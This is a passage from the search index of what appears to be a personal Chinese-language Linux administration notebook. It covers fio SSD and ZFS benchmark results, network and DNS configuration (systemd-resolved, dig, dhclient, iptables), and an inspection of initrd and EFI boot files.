100=1.56%, 250=2.34%\n  cpu          : usr=0.20%, sys=4.67%, ctx=1444, majf=0, minf=2059\n  IO depths    : 1=0.1%, 2=0.2%, 4=0.4%, 8=99.3%, 16=0.0%, 32=0.0%, &gt;=64=0.0%\n     submit    : 0=0.0%, 4=100.0%, 8=0.0%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     complete  : 0=0.0%, 4=99.9%, 8=0.1%, 16=0.0%, 32=0.0%, 64=0.0%, &gt;=64=0.0%\n     issued rwts: total=1024,0,0,0 short=0,0,0,0 dropped=0,0,0,0\n     latency   : target=0, window=0, percentile=100.00%, depth=8\n\nRun status group 0 (all jobs):\n   READ: bw=168MiB/s (177MB/s), 168MiB/s-168MiB/s (177MB/s-177MB/s), io=1024MiB (1074MB), run=6078-6078msec\n\nDisk stats (read/write):\n  sda: ios=2108/1, merge=4/0, ticks=106583/0, in_queue=106584, util=95.24%\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u4f8b\u5b50","title":"\u4f8b\u5b50","text":"<p>aigo P7000Z 2TB pcie 4.0 (\u6807\u79f0\u8bfb 7350, \u5199 6750 MB/s) \u8f93\u51fa</p> <p>\u5355\u72ec\u5206\u533a</p> <pre><code>root@ryzen-pve \u279c  fio fio --filename=/dev/nvme0n1p5 ssd-win-likely.fio\nRun status group 0 (all jobs):\n   READ: bw=7043MiB/s (7385MB/s), 7043MiB/s-7043MiB/s (7385MB/s-7385MB/s), io=10.0GiB (10.7GB), run=1454-1454msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=6392MiB/s (6703MB/s), 6392MiB/s-6392MiB/s (6703MB/s-6703MB/s), io=10.0GiB (10.7GB), run=1602-1602msec\n\nRun status group 2 (all jobs):\n   READ: bw=344MiB/s (361MB/s), 344MiB/s-344MiB/s (361MB/s-361MB/s), io=2048MiB (2147MB), run=5950-5950msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=818MiB/s (857MB/s), 818MiB/s-818MiB/s (857MB/s-857MB/s), io=2048MiB (2147MB), run=2505-2505msec\n\nRun status group 4 (all jobs):\n  WRITE: bw=502MiB/s (526MB/s), 502MiB/s-502MiB/s (526MB/s-526MB/s), io=2048MiB (2147MB), run=4082-4082msec\n\nDisk stats (read/write):\n  nvme0n1: ios=544852/1011542, merge=0/0, ticks=373885/471120, in_queue=845097, util=91.87%\n</code></pre> <p>zfs dataset, compression=off</p> <pre><code>root@ryzen-pve \u279c  fio fio --filename=/pool0/test/fio.img ssd-win-likely.fio\n\nRun status group 0 (all jobs):\n   READ: bw=2201MiB/s (2308MB/s), 2201MiB/s-2201MiB/s (2308MB/s-2308MB/s), io=10.0GiB (10.7GB), run=4653-4653msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=2786MiB/s (2921MB/s), 2786MiB/s-2786MiB/s (2921MB/s-2921MB/s), io=10.0GiB (10.7GB), run=3676-3676msec\n\nRun status group 2 (all jobs):\n   READ: bw=174MiB/s (183MB/s), 174MiB/s-174MiB/s (183MB/s-183MB/s), io=2048MiB (2147MB), run=11739-11739msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=165MiB/s (173MB/s), 165MiB/s-165MiB/s (173MB/s-173MB/s), io=2048MiB (2147MB), run=12393-12393msec\n\nRun status group 4 (all jobs):\n  WRITE: bw=194MiB/s (204MB/s), 194MiB/s-194MiB/s (204MB/s-204MB/s), io=2048MiB (2147MB), run=10530-10530msec\n</code></pre> <p>samsung pm9a1 zfs dataset compression=off</p> <pre><code>root@ryzen-pve \u279c  fio fio --filename=/rpool/test/fio.img ssd-win-likely.fio\ns\nRun status group 0 (all jobs):\n   READ: bw=2485MiB/s (2606MB/s), 2485MiB/s-2485MiB/s (2606MB/s-2606MB/s), io=10.0GiB (10.7GB), run=4121-4121msec\n\nRun status group 1 (all jobs):\n  WRITE: bw=2683MiB/s (2813MB/s), 2683MiB/s-2683MiB/s (2813MB/s-2813MB/s), io=10.0GiB (10.7GB), run=3817-3817msec\n\nRun status group 2 (all jobs):\n   READ: bw=171MiB/s (179MB/s), 171MiB/s-171MiB/s (179MB/s-179MB/s), io=2048MiB (2147MB), run=12004-12004msec\n\nRun status group 3 (all jobs):\n  WRITE: bw=207MiB/s (217MB/s), 207MiB/s-207MiB/s (217MB/s-217MB/s), io=2048MiB (2147MB), run=9897-9897msec\n\nRun status group 4 (all jobs):\n  WRITE: bw=243MiB/s (254MB/s), 243MiB/s-243MiB/s (254MB/s-254MB/s), io=2048MiB (2147MB), run=8439-8439msec\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7f51\u7edc","title":"\u7f51\u7edc","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#network-\u76f8\u5173","title":"network \u76f8\u5173","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u5e38\u89c1\u7f51\u7edc\u914d\u7f6e\u65b9\u6cd5","title":"\u5e38\u89c1\u7f51\u7edc\u914d\u7f6e\u65b9\u6cd5","text":"<p>NetworkConfiguration - Debian Wiki</p> <ul> <li>ifupdown<ul> <li>debian \u9ed8\u8ba4\u7684\u65b9\u6cd5</li> <li>\u914d\u7f6e\u6587\u4ef6\u4e3a\uff1a<code>/etc/network/interfaces</code></li> <li>ifupdown2 \u662f\u65b0\u7248\uff0c\u652f\u6301\u66f4\u52a0\u7075\u6d3b\u7684\u914d\u7f6e</li> </ul> </li> <li>NetworkManger<ul> <li>\u76ee\u6807\u662f\u5c3d\u53ef\u80fd\u4fdd\u8bc1\u8fde\u63a5\u5230\u7f51\u7edc\u3002\u4f7f\u7528\u81ea\u52a8\u7684\u89c4\u5219\u914d\u7f6e\u7f51\u7edc\uff0c\u6bd4\u5982\u68c0\u6d4b\u5230\u6709\u7ebf\u8bbe\u5907\u5c31\u4f1a\u8fde\u63a5</li> <li>\u5e38\u7528\u4e8e\u684c\u9762\u53d1\u884c\u7248</li> <li>\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177 nmcli \u8fdb\u884c\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 TUI \u5de5\u5177 nmtui \u8fdb\u884c\u914d\u7f6e\u3002</li> </ul> </li> <li>systemd<ul> <li>\u76f8\u5173\u7684\u670d\u52a1\uff1asystemd-networkd, systemd-resolved</li> <li>\u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e<code>/etc/system/network</code>\uff0c\u4f7f\u7528\u7c7b\u4f3c\u4e8e ini \u683c\u5f0f</li> </ul> </li> <li>netplan<ul> <li>\u5e38\u89c1\u4e8e ubuntu\uff0c\u5e95\u5c42\u53ef\u4ee5\u57fa\u4e8e systemd-networkd \u6216 NetworkManager\uff08\u670d\u52a1\u5668\u7248\u548c\u684c\u9762\u7248\uff09</li> <li>\u662f\u53e6\u4e00\u5c42\u62bd\u8c61\uff0c\u4f7f\u7528\u81ea\u5df1\u7684\u914d\u7f6e\u6587\u4ef6<code>/etc/netplan/</code>\uff0c\u4f7f\u7528 yaml \u683c\u5f0f\u3002</li> </ul> </li> </ul> <p>networking - How exactly are NetworkManager, networkd, netplan, ifupdown2, and iproute2 interacting? - Unix &amp; Linux Stack Exchange</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dns-\u914d\u7f6e\u65b9\u6cd5","title":"dns \u914d\u7f6e\u65b9\u6cd5","text":"<ul> <li>\u9700\u8981\u533a\u5206\uff1a\u6709\u4e9b\u5de5\u5177\u662f\u5728\u672c\u5730\u8fd0\u884c\u4e00\u4e2a dns \u670d\u52a1\u5668\uff0c\u76d1\u542c 53 \u8bf7\u6c42\u3002\u8fd9\u79cd\u53ef\u4ee5\u5b9e\u73b0 local dns caching \u7b49\u529f\u80fd\u3002</li> <li>\u6709\u4e9b\u5de5\u5177\u53ea\u662f\u4fee\u6539 <code>/etc/resolve.conf</code> \uff08\u901a\u5e38\u4e0d\u76f4\u63a5\u4fee\u6539\uff0c\u800c\u662f\u66ff\u6362\u8be5\u6587\u4ef6\u4e3a\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff09\u4e3a\u4e0a\u6e38 dns\u3002</li> <li>\u6709\u54ea\u4e9b dns server<ul> <li>dnsmasq</li> <li>systemd-resolved </li> </ul> </li> <li>NetworkManger \u672c\u8eab\u4e0d\u63d0\u4f9b dns \u80fd\u529b\uff0c\u53ef\u4ee5\u914d\u7f6e\u4f7f\u7528\u4e0d\u540c\u540e\u7aef\uff1a<ul> <li>default\uff08\u4fee\u6539 resolve.conf \u5305\u542b\uff08\u6240\u6709\u63a5\u53e3\uff1f\uff09\u4e0a\u6e38 dns</li> <li>dnsmasq \u548c systemd-resolved </li> </ul> </li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dnsmasq","title":"dnsmasq","text":"<p>openwrt \u4e0a\u6bd4\u8f83\u719f\u6089</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dns-\u914d\u7f6e\u65b9\u6cd5--systemd-resolved","title":"dns \u914d\u7f6e\u65b9\u6cd5 \u2014\u2014 systemd-resolved","text":"<p>systemd-resolved - ArchWiki (archlinux.org)</p> <p>systemd-resolved\u00a0has four different modes for handling the file\u2014stub, static, uplink and foreign</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u8bbe\u7f6e\u4e0a\u6e38-dns","title":"\u8bbe\u7f6e\u4e0a\u6e38 DNS","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u81ea\u52a8","title":"\u81ea\u52a8","text":"<p>systemd-resolved\u00a0will work out of the box with a\u00a0network manager\u00a0using\u00a0<code>/etc/resolv.conf</code>. No particular configuration is required since\u00a0systemd-resolved\u00a0will be detected by following the\u00a0<code>/etc/resolv.conf</code>\u00a0symlink. This is going to be the case with\u00a0systemd-networkd,\u00a0NetworkManager, and\u00a0iwd.</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u624b\u52a8","title":"\u624b\u52a8","text":"<pre><code>/etc/systemd/resolved.conf.d/dns_servers.conf\n\n[Resolve]\nDNS=192.168.35.1 fd7b:d0bd:7a6e::1\nDomains=~.\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#fallbak","title":"fallbak","text":"<p>\u6ca1\u6709 DNS \u65f6\uff0cfallbak \u5230 Cloudflare, Quad9 and Google.</p> <p>\u6b63\u5e38\u60c5\u51b5/etc/resolv.conf\u4e3a\u8f6f\u8fde\u63a5\uff0c\u5185\u5bb9\u4e3a <pre><code>search ustc.edu.cn\nnameserver 127.0.0.53\noptions edns0 trust-ad\n</code></pre></p> <p>\u624b\u52a8\u4fee\u590d <pre><code>ln -s /run/systemd/resolve/stub-resolv.conf /etc/resolv.conf -f\n</code></pre></p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7f51\u7edc\u5de5\u5177","title":"\u7f51\u7edc\u5de5\u5177","text":"<p>Chapter\u00a05.\u00a0Network setup (debian.org)</p> <ul> <li>iproute2</li> <li>iptables</li> <li>ethtool</li> <li>mtr</li> <li>nmap</li> <li>tcpdump</li> <li>dnsutils: nslookup, dig</li> </ul>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dhcp","title":"dhcp","text":"<p>\u6d4b\u8bd5 dhcp \u662f\u5426\u5de5\u4f5c</p> <ul> <li>netplan\uff08\u6216\u8005\u91cd\u542f\u5bb9\u5668\uff09 + tcpdump  + wireshark</li> </ul> <ul> <li>-d: debug \u6a21\u5f0f\uff0c\u524d\u53f0\u8fd0\u884c</li> <li>-n: \u4e0d\u8bbe\u7f6e\u63a5\u53e3</li> <li>-s: \u6307\u5b9a dhcp server\uff08\u5426\u5219\u662f\u5e7f\u64ad\uff09</li> <li>-w: \u6ca1\u6709\u627e\u5230\u5e7f\u64ad\u63a5\u53e3\u65f6\u4e5f\u4e0d\u9000\u51fa\uff0c\u7528\u4e8e\u53ef\u63d2\u62d4\u7f51\u5361\u3002</li> </ul> <pre><code> dhclient -d -n -w -s 192.168.35.1\n</code></pre> <p>\u63a5\u53e3\u653e\u5728\u524d\u9762 <pre><code>sudo dhclient eth0 -n -v -d\n</code></pre></p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dns","title":"dns","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#dig","title":"dig","text":"<pre><code>dig [@server] [-p port] [-t type] [-4] [-6] [+trace] name\n</code></pre> <ul> <li>@ \u6307\u5b9a DNS \u67e5\u8be2\u4f7f\u7528\u7684\u670d\u52a1\u5668\u540d\u79f0\u6216 IP\uff0cIP \u5730\u5740\u53ef\u4ee5\u662f\u7528\u70b9\u5206\u9694\u7684 IPv4 \u5730\u5740\u4e5f\u53ef\u4ee5\u662f\u5192\u53f7\u5206\u9694\u7684 IPv6 \u5730\u5740\u3002\u5f53\u53c2\u6570\u6307\u5b9a\u7684\u503c\u662f\u670d\u52a1\u5668\u7684\u4e3b\u673a\u540d\u65f6\uff0cdig \u547d\u4ee4\u4f1a\u5728\u67e5\u8be2\u8be5\u57df\u540d\u670d\u52a1\u5668\u524d\u5148\u89e3\u6790\u8be5\u4e3b\u673a\u540d\uff1b</li> <li>-p \u6307\u5b9a DNS \u67e5\u8be2\u4f7f\u7528\u7684\u7aef\u53e3\u53f7\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b DNS \u67e5\u8be2\u4f7f\u7528\u6807\u51c6\u7684 53 \u7aef\u53e3\uff0c\u82e5\u4f7f\u7528\u975e\u7aef\u53e3\u5219\u9700\u8981\u901a\u8fc7 -p \u53c2\u6570\u6307\u5b9a\uff0c\u53ef\u4f7f\u7528\u6b64\u9009\u9879\u6765\u6d4b\u8bd5\u5df2\u914d\u7f6e\u4e3a\u4fa6\u542c\u975e\u6807\u51c6\u7aef\u53e3\u53f7\u4e0a\u7684 DNS \u670d\u52a1\u5668\uff1b</li> <li>-t \u6307\u5b9a DNS \u67e5\u8be2\u7684\u8bb0\u5f55\u7c7b\u578b\uff0c\u5e38\u7528\u7684\u7c7b\u578b\u5305\u62ec\uff1aA/AAAA/NS/MX/CNAME \u7b49\uff0c\u7f3a\u7701\u67e5\u8be2\u7c7b\u578b\u662f A\uff1b</li> <li>-4 \u6307\u5b9a dig \u547d\u4ee4\u4ec5\u4f7f\u7528 IPv4 \u67e5\u8be2\u4f20\u8f93\uff1b</li> <li>-6 \u6307\u5b9a dig \u547d\u4ee4\u4ec5\u4f7f\u7528 IPv6 \u67e5\u8be2\u4f20\u8f93\uff1b</li> <li>+trace \u8ddf\u8e2a\u4ece\u6839\u540d\u79f0\u670d\u52a1\u5668\u5f00\u59cb\u7684\u8fed\u4ee3\u67e5\u8be2\u8fc7\u7a0b\uff0c\u7f3a\u7701\u60c5\u51b5\u4e0d\u4f7f\u7528\u8ddf\u8e2a\u3002\u542f\u7528\u8ddf\u8e2a\u65f6\uff0cdig \u547d\u4ee4\u4f1a\u6267\u884c\u8fed\u4ee3\u67e5\u8be2\u4ee5\u89e3\u6790\u8981\u67e5\u8be2\u7684\u540d\u79f0\uff0c\u663e\u793a\u6765\u81ea\u7528\u4e8e\u89e3\u6790\u67e5\u8be2\u7684\u6bcf\u4e2a\u670d\u52a1\u5668\u7684\u5e94\u7b54\u3002</li> </ul> <p>\u6307\u5b9a\u89e3\u6790\u7c7b\u578b</p> <ul> <li>NS \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u57df\u540d\u7531\u54ea\u4e2a DNS \u670d\u52a1\u5668\u8fdb\u884c\u89e3\u6790\uff1b</li> <li>CNAME \u8bb0\u5f55\uff1a\u7528\u6765\u5b9a\u4e49\u57df\u540d\u7684\u522b\u540d\uff0c\u65b9\u4fbf\u5b9e\u73b0\u5c06\u591a\u4e2a\u57df\u540d\u89e3\u6790\u5230\u540c\u4e00\u4e2a IP \u5730\u5740\uff1b</li> <li>A \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u4e3b\u673a\u540d\u5bf9\u5e94\u7684 IPv4 \u5730\u5740\uff1b</li> <li>AAAA \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u4e3b\u673a\u540d\u5bf9\u5e94\u7684 IPv6 \u5730\u5740\uff1b</li> <li>MX \u8bb0\u5f55\uff1a\u7528\u6765\u6307\u5b9a\u6536\u4ef6\u4eba\u57df\u540d\u7684\u90ae\u4ef6\u670d\u52a1\u5668\uff0cSMTP \u534f\u8bae\u4f1a\u6839\u636e MX \u8bb0\u5f55\u7684\u503c\u6765\u51b3\u5b9a\u90ae\u4ef6\u7684\u8def\u7531\u8fc7\u7a0b\uff1b</li> <li>PTR \u8bb0\u5f55\uff1a\u5e38\u7528\u4e8e\u53cd\u5411\u5730\u5740\u89e3\u6790\uff0c\u5c06 IP \u5730\u5740\u89e3\u6790\u5230\u5bf9\u5e94\u7684\u540d\u79f0\uff1b</li> <li>SOA \u8bb0\u5f55\uff1a\u79f0\u4e3a\u8d77\u59cb\u6388\u6743\u673a\u6784\u8bb0\u5f55\uff0c\u4e0d\u540c\u4e8e NS \u8bb0\u5f55\u7528\u4e8e\u6807\u8bc6\u591a\u53f0\u57df\u540d\u89e3\u6790\u670d\u52a1\u5668\uff0cSOA \u8bb0\u5f55\u7528\u4e8e\u5728\u591a\u53f0 NS \u8bb0\u5f55\u4e2d\u54ea\u4e00\u53f0\u662f\u4e3b DNS \u670d\u52a1\u5668\u3002</li> </ul> <p>USTC lug \u52a0\u7fa4\u94fe\u63a5</p> <pre><code>dig jointele.ustclug.org TXT\n\n;; ANSWER SECTION:\njointele.ustclug.org.   600     IN      TXT     \"(base64) aHR0cHM6Ly90Lm1lLytYOXg1V09qTVpVbGlZVGRs\"\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u67e5\u770b\u4e0a\u6e38-dns","title":"\u67e5\u770b\u4e0a\u6e38 dns","text":"<p>\u6709\u591a\u79cd dns \u8bbe\u7f6e\u65b9\u5f0f\uff1a</p> <ul> <li>\u76f4\u63a5\u7f16\u8f91/etc/resolve \u8bbe\u7f6e\u4e0a\u6e38 dns</li> <li>systemd-resolve \u670d\u52a1\uff08\u81ea\u52a8\u8bbe\u7f6e dns\uff09</li> </ul> <pre><code>systemd-resolve --status\n</code></pre> <p>\u4ece ubuntu22.04 \u5f00\u59cb</p> <pre><code>resolvectl status\n</code></pre> <p>systemd-resolve command not found in Ubuntu 22.04 desktop - Ask Ubuntu</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#iptables","title":"iptables","text":"<p>\u6301\u4e45\u5316</p> <pre><code>iptables-save &gt; /etc/iptables/rules.v4  # \nip6tables-save &gt; /etc/iptables/rules.v6 \niptables-restore &lt; /etc/iptables/rules.v4\n</code></pre> <p>\u5b89\u88c5 iptabels-persistent</p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#bridge-iptable-\u4e0d\u751f\u6548","title":"bridge iptable \u4e0d\u751f\u6548","text":"<pre><code>bridge-nf-call-iptables - BOOLEAN\n 1 : pass bridged IPv4 traffic to iptables' chains.\n 0 : disable this.\n Default: 1\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u7cfb\u7edf\u7ef4\u62a4","title":"\u7cfb\u7edf\u7ef4\u62a4","text":"","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#initrd","title":"initrd","text":"<p>ubuntu22.04 intird 69M\uff0c\u5168\u90e8\u90fd\u662f\u5fae\u7801\u3002</p> <p>EFI \u5206\u533a\u53ea\u6709 grub.efi \u548c grub \u914d\u7f6e <pre><code>root@ryzen \u279c  EFI tree -L 2 ubuntu\nubuntu\n\u251c\u2500\u2500 BOOTX64.CSV\n\u251c\u2500\u2500 grub.cfg\n\u251c\u2500\u2500 grubx64.efi\n\u251c\u2500\u2500 mmx64.efi\n\u2514\u2500\u2500 shimx64.efi\n</code></pre> grub \u914d\u7f6e\uff0c\u9700\u8981\u6302\u8f7d\u5b8c\u6574\u7684 root \u5206\u533a\uff0c\u7136\u540e\u53bb /boot/grub \u4e2d\u7ee7\u7eed <pre><code>search.fs_uuid ff2e2d36-0788-436f-9d42-e390f318f0ec root hd0,gpt3\nset prefix=($root)'/boot/grub'\nconfigfile $prefix/grub.cfg\n</code></pre></p> <p>pve initrd 59M\uff0c\u5305\u542b\u4e86 <code>/etc/, /usr/bin, /usr/lib/firmware, /usr/lib/modules/***.ko</code></p> <p>pve EFI \u5206\u533a\u5305\u542b\u4e86 initrd, vmlinuz <pre><code>root@ryzen-pve \u279c  ~ l /boot/efi/EFI/proxmox/6.8.12-2-pve/\ntotal 73M\n-rwxr-xr-x 1 root root 59M Jan 22 14:28 initrd.img-6.8.12-2-pve\n-rwxr-xr-x 1 root root 14M Sep  5 18:03 vmlinuz-6.8.12-2-pve\n</code></pre></p> <p>\u8fd8\u5305\u542b\u4e00\u4e2a loader \u76ee\u5f55\uff08\u6ca1\u6709\u4f7f\u7528 grub\uff09 <pre><code>root@ryzen-pve \u279c  ~ tree -L 3 /boot/efi/loader\n/boot/efi/loader\n\u251c\u2500\u2500 entries\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 proxmox-6.5.13-6-pve.conf\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 proxmox-6.8.12-2-pve.conf\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 proxmox-6.8.4-3-pve.conf\n\u251c\u2500\u2500 entries.srel\n\u251c\u2500\u2500 loader.conf\n\u2514\u2500\u2500 random-seed\n\n# proxmox-xxx.conf \u5185\u5bb9\ntitle    Proxmox Virtual Environment\nversion  6.8.12-2-pve\noptions  root=ZFS=rpool/ROOT/pve-1 boot=zfs amd_iommu=on iommu=pt pcie_acs_override=multifunction mitigations=off\nlinux    /EFI/proxmox/6.8.12-2-pve/vmlinuz-6.8.12-2-pve\ninitrd   /EFI/proxmox/6.8.12-2-pve/initrd.img-6.8.12-2-pve\n</code></pre></p> <p>ubuntu \u542f\u52a8\u65f6\uff0cgrub \u542f\u52a8\u540e\uff0c\u6302\u8f7d </p>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u4f7f\u7528-lsinitrd-\u67e5\u770b","title":"\u4f7f\u7528 lsinitrd \u67e5\u770b","text":"<pre><code>sudo apt install dracut-core\n</code></pre> <pre><code>root@ryzen \u279c  /boot lsinitrd /boot/initrd.img-$(uname -r)\nImage: /boot/initrd.img-6.8.0-49-generic: 69M\n========================================================================\nEarly CPIO image\n========================================================================\ndrwxr-xr-x   3 root     root            0 Dec 18  2019 .\ndrwxr-xr-x   3 root     root            0 Dec 18  2019 kernel\ndrwxr-xr-x   3 root     root            0 Dec 18  2019 kernel/x86\ndrwxr-xr-x   2 root     root            0 Dec 18  2019 kernel/x86/microcode\n-rw-r--r--   1 root     root        76166 Dec 18  2019 kernel/x86/microcode/AuthenticAMD.bin\n========================================================================\nVersion:\n\nArguments:\ndracut modules:\n========================================================================\ndrwxr-xr-x   2 root     root            0 Aug 29 20:00 kernel\ndrwxr-xr-x   2 root     root            0 Aug 29 20:00 kernel/x86\ndrwxr-xr-x   2 root     root            0 Aug 29 20:00 kernel/x86/microcode\ndrwxr-xr-x   2 root     root            0 Aug 29 20:00 kernel/x86/microcode/.enuineIntel.align.0123456789abc\n-rw-r--r--   1 root     root      7979008 Aug 29 20:00 kernel/x86/microcode/GenuineIntel.bin\n========================================================================\n</code></pre>","tags":["fdisk","mount","fio","nmcli","iwd","dig","ldap","CA","apt","journalctl","v4l2"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/#\u89e3\u538b\u67e5\u770b","title":"\u89e3\u538b\u67e5\u770b","text":"<p>initrd.img 